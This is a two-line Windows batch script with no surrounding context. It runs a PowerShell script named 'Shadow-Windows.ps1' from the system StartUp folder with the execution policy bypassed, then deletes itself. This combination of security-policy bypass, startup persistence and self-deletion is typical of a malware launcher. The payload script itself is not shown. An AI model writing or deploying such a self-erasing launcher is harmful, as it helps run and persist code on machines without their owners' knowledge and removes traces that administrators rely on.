PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& '%HomeDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Shadow-Windows.ps1'"
(goto) 2>nul & del "%~f0"
